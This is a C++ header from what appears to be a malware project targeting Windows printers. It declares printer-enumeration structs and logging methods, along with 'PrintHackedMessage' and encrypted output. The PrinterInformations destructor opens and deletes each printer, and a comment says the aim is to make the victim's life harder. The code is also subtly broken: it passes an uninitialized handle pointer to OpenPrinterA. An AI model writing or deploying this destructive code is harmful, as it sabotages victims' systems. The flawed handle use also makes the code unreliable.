#include "Includes.h"
//Logs for interface implementation
#include "Logs.h"
//Printer/Spooler headers (winspool)
#include <winspool.h>

//No terminal in release mode so no need to include Colors.h
#ifdef _DEBUG
	#include "Colors.h"
#endif

#pragma once

//Documentations to read :
//https://docs.microsoft.com/en-us/windows/win32/printdocs/printing-and-print-spooler-functions

struct PrinterInformations {

	//Operator <<�to print our PrinterInformations dae right waey !
	friend std::ostream& operator<<(std::ostream& outputStream, const PrinterInformations& c) {
		outputStream << "Printer Name : " << c.PrinterName << std::endl;
		outputStream << "Default Printer : " << (c.DefaultPrinter == true ? "True" : "False") << std::endl;
		outputStream << "Share Name : " << c.PrinterShareName << std::endl;
		outputStream << "Ports : " << (c.PrinterPorts.length() > 1 ? c.PrinterPorts : "None") << std::endl;
		outputStream << "DriverName : " << (c.PrinterDriverName.length() > 1 ? c.PrinterDriverName : "None") << std::endl;
		outputStream << "Comment : " << c.PrinterComment << std::endl;
		outputStream << "Location : " << c.PrinterLocation << std::endl;
		outputStream << "Processor : " << c.PrinterProcessor << std::endl;
		outputStream << "Status : " << c.PrinterStatus << std::endl;
		outputStream << "Current Jobs : " << c.PrintercJobs << std::endl;
		outputStream << "Printer Priority : " << c.PrinterPriority << std::endl;
		outputStream << "Printer Average Print Per Minute : " << c.PrinterAveragePM << std::endl << std::endl;
		return outputStream;
	}

	~PrinterInformations(){
		//Delete Printer from list to make the life of the victim harder lel.
		LPHANDLE hPrinter;
		if(OpenPrinterA((LPSTR)this->PrinterName.c_str(), hPrinter, NULL) != 0){
			//If the function succeed and we have a handle on the current printer
			//Try to delete the printer.
			try{
				if(DeletePrinter(hPrinter)){
					//Log Delete printer succeeded.
				} else {
					throw std::runtime_error(std::string("Error when trying to delete printer ") + this->PrinterName);
				}
			} catch(std::runtime_error& e){
				#ifdef _DEBUG
					//Print to console
					std::cout << e.what() << std::endl;
				#else
					//Log to file
				#endif
			} catch(std::exception& e){
				#ifdef _DEBUG
					//Print to console
					std::cout << e.what() << std::endl;
				#else
					//Log to file
				#endif
			} catch(...){
				#ifdef _DEBUG
					//Print to console
					std::cout << "Something odd happened when trying to delete PrinterInformations" << std::endl;
				#else
					//Log to file
				#endif
			}
			
		}
	}
	std::string PrinterName; //Name of the printer
	
	std::string PrinterShareName; //Share name of the printer (Usually none if there is no active directory)
	
	std::string PrinterPorts; //A pointer to a null-terminated string that identifies the port(s) used to transmit 
							  //data to the printer. If a printer is connected to more than one port, the names of 
							  //each port must be separated by commas (for example, "LPT1:,LPT2:,LPT3:").
	
	std::string PrinterDriverName; //A pointer to a null-terminated string that specifies the name of the printer driver.
	
	std::string PrinterComment; //A pointer to a null-terminated string that provides a brief description of the printer.
	
	std::string PrinterLocation; //A pointer to a null-terminated string that specifies the physical location of the printer (for example, "Bldg. 38, Room 1164").
	
	std::string PrinterProcessor; //A pointer to a null-terminated string that specifies 
								  //the name of the print processor used by the printer.
								  //You can use the EnumPrintProcessors function to obtain a list of 
								  //print processors installed on a server.
	
	DWORD PrinterStatus; //The Printer Status
	
	DWORD PrintercJobs; //The number of print jobs that have been queued for the printer.
	
	DWORD PrinterPriority; //A priority value that the spooler uses to route print jobs.

	DWORD PrinterAveragePM; //The average number of pages per minute that have been printed on the printer.

	bool DefaultPrinter = false; //Is the printer the default one.
};

struct Printers : public Logs {
	//LOGS INTERFACE IMPLEMENTATION
	bool OutputFile(const std::string& message, const std::string& path) override;
	bool OutputEncryptedContent(const std::string& message, const std::string& path) noexcept override; //TODO : Remove the noexcept
	//Functions and Members
	std::string DefaultPrinterName;
	std::vector<PrinterInformations> Printers; //Vector of PrinterInformations (Basically our list of printers)
	bool EnumeratePrintersInformation();
	void PrintHackedMessage();
};
